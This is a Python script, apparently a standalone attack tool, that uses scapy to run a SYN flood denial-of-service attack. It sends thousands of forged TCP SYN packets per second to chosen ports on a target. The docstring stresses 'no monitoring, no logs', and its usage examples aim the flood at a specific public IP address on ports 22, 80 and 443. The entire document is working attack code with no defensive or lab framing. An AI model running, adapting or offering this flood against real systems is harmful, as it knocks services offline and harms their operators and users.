#!/usr/bin/env python3
"""
synflood.py — pure SYN flood, no monitoring, no logs. Ctrl+C to stop.

Usage:
  sudo python3 synflood.py --target 104.236.68.226 --port 22,80,443 --rate 5000
  sudo python3 synflood.py --target 104.236.68.226 --port 80 --rate 10000
"""

import argparse
import random
import signal
import sys
import os
import time

try:
    from scapy.all import IP, TCP, send, conf
    conf.verb = 0
except ImportError:
    sys.exit("scapy required: pip3 install scapy")

if os.geteuid() != 0:
    sys.exit("Need root: sudo python3 synflood.py ...")

ap = argparse.ArgumentParser()
ap.add_argument("--target", required=True)
ap.add_argument("--port", default="80")
ap.add_argument("--rate", type=int, default=5000)
args = ap.parse_args()

ports = [int(p) for p in args.port.split(",")]
stop = False

def quit(s, f):
    global stop
    stop = True

signal.signal(signal.SIGINT, quit)

sent = 0
t0 = time.time()
batch = max(1, args.rate // 20)
sleep_per_batch = batch / args.rate if args.rate > 0 else 0

print(f"SYN flood → {args.target} ports={ports} rate={args.rate}pps  Ctrl+C to stop")

while not stop:
    for _ in range(batch):
        if stop:
            break
        for p in ports:
            send(IP(dst=args.target) / TCP(dport=p, flags="S",
                 sport=random.randint(1024, 65535),
                 seq=random.randint(0, 2**32 - 1)), verbose=0)
            sent += 1
    if sleep_per_batch > 0:
        time.sleep(sleep_per_batch)
    elapsed = time.time() - t0
    if int(elapsed) % 5 == 0 and sent % 500 < len(ports):
        print(f"  {sent} pkts  {sent/elapsed:.0f} pps  {elapsed:.0f}s", flush=True)

elapsed = time.time() - t0
print(f"\nDone: {sent} pkts in {elapsed:.1f}s ({sent/elapsed:.0f} pps)")
